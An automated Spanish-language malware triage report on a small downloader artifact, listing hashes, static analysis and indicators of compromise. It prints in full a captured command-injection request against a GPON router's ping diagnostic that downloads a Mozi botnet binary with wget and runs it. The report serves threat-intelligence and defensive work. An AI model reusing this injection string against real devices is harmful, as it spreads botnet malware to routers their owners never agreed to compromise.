# 🧬 Payload Analysis

`d3a208086490d82d49e5475c9533e543e52ea60fb788d68667fe2926b1f411aa`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 316 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `Mozi.m+-O+-` en `hxxp://[internal-ip-redacted]:8088/Mozi.m+-O+-`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:44:03.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `d3a208086490d82d49e5475c9533e543e52ea60fb788d68667fe2926b1f411aa`
- **SHA1:** `51c0a6c4590c75ed91435509945fd35c97e0b6e2`
- **MD5:** `8abb17c9f1d99c732e3b4bbe92d3a915`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 316 B |
| Entropía | 5.38 |
| Strings | 8 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=3

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://[internal-ip-redacted]:8088/Mozi.m+-O+->/tmp/gpon80;sh+/t
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://[internal-ip-redacted]:8088/Mozi.m+-O+- | strings |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://[internal-ip-redacted]:8088/Mozi.m+-O+->/tmp/gpon80;sh+/t | strings |
| hash | d3a208086490d82d49e5475c9533e543e52ea60fb788d68667fe2926b1f411aa | static_analysis |
| ip | 36.255.33.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
